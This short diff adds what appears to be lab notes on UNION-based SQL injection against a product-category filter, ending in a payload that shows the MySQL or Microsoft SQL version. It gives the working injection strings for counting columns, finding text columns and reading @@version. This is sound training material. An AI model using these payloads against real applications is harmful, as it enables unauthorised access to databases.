@@ -1,0 +1,19 @@
+SQLi - Querying the database type and version of MySQL & microsoft
+
+SQL injection - Product category
+
+End goal: display the database version string
+
+Analysis:
+
+1. Find number of columns
+' ORDER BY 3# => internal server error
+
+3 - 1 = 2 columns
+
+2. Figure out which columns contain text
+'UNION select 'a', 'a'#
+
+3. Output the version
+
+ ' UNION SELECT @@version, null#
